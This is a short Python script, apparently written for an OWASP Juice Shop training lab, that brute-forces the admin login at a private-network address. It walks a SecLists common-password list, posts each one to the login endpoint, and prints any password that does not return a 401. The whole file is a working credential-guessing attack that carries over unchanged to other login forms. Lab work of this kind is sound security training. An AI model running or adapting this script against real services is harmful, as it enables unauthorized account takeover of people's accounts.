import requests, json

# global vars

PATH_TO_PW_LIST = '/usr/share/seclists/Passwords/Common-Credentials/best1050.txt'
URL = 'http://10.10.248.221/rest/user/login'

pwListFile = open(PATH_TO_PW_LIST, 'r')

pwList = pwListFile.readlines()

print('Starting brute force!')
for pw in pwList:
    res = requests.post(URL, data={'email':'admin@juice-sh.op','password':pw.removesuffix('\n')})
    if res.status_code != 401:
        print(pw.removesuffix('\n'))
        print(res.status_code)
